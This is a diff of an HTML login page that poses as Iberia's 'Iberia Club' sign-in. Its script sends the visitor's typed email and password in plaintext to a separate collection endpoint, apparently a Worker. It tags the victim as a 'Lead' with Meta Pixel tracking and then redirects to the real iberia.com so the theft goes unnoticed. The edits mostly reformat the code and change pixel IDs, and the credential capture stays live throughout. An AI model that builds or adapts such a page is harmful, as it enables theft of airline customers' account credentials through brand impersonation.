@@ -4,26 +4,35 @@
   <meta charset="UTF-8">
   <title>Acceso a Iberia Club</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="facebook-domain-verification" content="8xqejewgs3ghsgy8vxalva0n55s9tz" />
+
+  <!-- Verificação de domínio Facebook -->
+  <meta name="facebook-domain-verification" content="tfjqeb9cpakh0am0cipliz61xurfub" />
 
   <link rel="stylesheet" href="style.css">
   <link rel="icon" type="image/svg+xml" href="./Xjdsahd637sddUmi/logotopo.svg">
   <link rel="stylesheet" href="./Xjdsahd637sddUmi/all.min.css">
 
-  <!-- Meta Pixel -->
+  <!-- Meta Pixel Code -->
   <script>
-    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
-    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1151815573251183');
-    fbq('track', 'PageView');
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+
+  fbq('init', '817825647898428');     <!-- Pixel que você usa no Worker -->
+  fbq('track', 'PageView');
   </script>
+
   <noscript>
     <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=1151815573251183&ev=PageView&noscript=1"/>
+         src="https://www.facebook.com/tr?id=817825647898428&ev=PageView&noscript=1"/>
   </noscript>
+  <!-- End Meta Pixel Code -->
+
 </head>
 <body>
 
@@ -36,6 +45,7 @@
         </a>
         <div class="ib-header__separator"></div>
       </div>
+
       <div class="ib-header__right">
         <span class="ib-header__label">¿No tienes cuenta?</span>
         <a href="https://onbusinessiberia.web.app/" class="ib-header__button">Regístrate</a>
@@ -68,11 +78,13 @@
       <div class="divider"><span>o</span></div>
 
       <button type="button" class="google-btn">
-        <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google"> Entrar con Google
+        <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google">
+        Entrar con Google
       </button>
 
       <button type="button" class="facebook-btn">
-        <span class="facebook-f">f</span> Entrar con Facebook
+        <span class="facebook-f">f</span>
+        Entrar con Facebook
       </button>
 
       <div class="register">
@@ -88,17 +100,21 @@
         <div class="ib-footer__logo ib-footer__logo--red">
           <img src="./Xjdsahd637sddUmi/logofoter.svg" alt="Iberia">
         </div>
+
         <div class="ib-footer__links">
           <a href="https://onbusinessiberia.web.app/" class="ib-footer__link">Accesibilidad</a>
         </div>
       </div>
     </div>
+
     <div class="ib-footer__gray">
-      <div class="ib-footer__copyright">© Iberia 2025</div>
+      <div class="ib-footer__copyright">
+        © Iberia 2025
+      </div>
     </div>
   </footer>
 
-  <!-- SCRIPT -->
+  <!-- SCRIPT PRINCIPAL -->
   <script>
     // Mostrar/ocultar senha
     const eyeIcon = document.querySelector(".eye-icon");
@@ -107,41 +123,51 @@
       passwordInput.type = passwordInput.type === "password" ? "text" : "password";
     });
 
-    // Funções auxiliares para capturar cookies e parâmetros
+    // Captura GET utm
     function getParam(name) {
-      try { return new URLSearchParams(location.search).get(name) || ""; } catch(e) { return ""; }
+      try { return new URLSearchParams(location.search).get(name) || ""; }
+      catch(e) { return ""; }
     }
+
+    // Captura cookies
     function getCookie(name) {
       const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
       return m ? m[2] : "";
     }
+
+    // Coleta _fbp e _fbc
     function readFbpFbc() {
       const fbp = getCookie('_fbp');
       let fbc = getCookie('_fbc');
-      const fbclid = getParam('fbclid');
-      if (!fbc && fbclid) fbc = 'fb.1.' + Date.now() + '.' + fbclid;
+      const fbclid = getParam("fbclid");
+      if (!fbc && fbclid) fbc = "fb.1." + Date.now() + "." + fbclid;
       return { fbp, fbc, fbclid };
     }
+
+    // Coleta UTM
     function readUTMs() {
       const p = (n) => getParam(n);
       return {
-        utm_source: p('utm_source'),
-        utm_medium: p('utm_medium'),
-        utm_campaign: p('utm_campaign'),
-        utm_term: p('utm_term'),
-        utm_content: p('utm_content')
+        utm_source: p("utm_source"),
+        utm_medium: p("utm_medium"),
+        utm_campaign: p("utm_campaign"),
+        utm_term: p("utm_term"),
+        utm_content: p("utm_content"),
       };
     }
 
     // Envio do formulário
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
+
       const email = e.target.email.value.trim();
       const password = e.target.password.value.trim();
-
       if (!email || !password) return;
 
-      const eventId = 'lead-' + Date.now() + '-' + Math.random().toString(36).slice(2);
+      // Gera ID único para deduplicação Browser+CAPI
+      const eventId =
+        "lead-" + Date.now() + "-" + Math.random().toString(36).slice(2);
+
       const { fbp, fbc, fbclid } = readFbpFbc();
       const utm = readUTMs();
 
@@ -150,26 +176,30 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            email: email,
-            password: password,
+            email,
+            password,
             origem: "formulario_firebase",
             consent: true,
             event_id: eventId,
             event_source_url: location.href,
-            fbp, fbc, fbclid,
+            fbp,
+            fbc,
+            fbclid,
             utm
           })
         });
 
-        if (window.fbq) fbq('track', 'Lead', {}, { eventID: eventId });
+        // Pixel navegador com o MESMO eventId do Worker
+        fbq("track", "Lead", {}, { eventID: eventId });
 
-        // Redireciona direto após envio (sem mostrar "Procesando...")
-        window.location.replace('https://www.iberia.com/es/');
+        // Redireciona depois do envio
+        window.location.replace("https://www.iberia.com/es/");
 
       } catch (err) {
-        console.error('Erro ao enviar', err);
+        console.error("Erro ao enviar", err);
       }
     });
   </script>
+
 </body>
 </html>
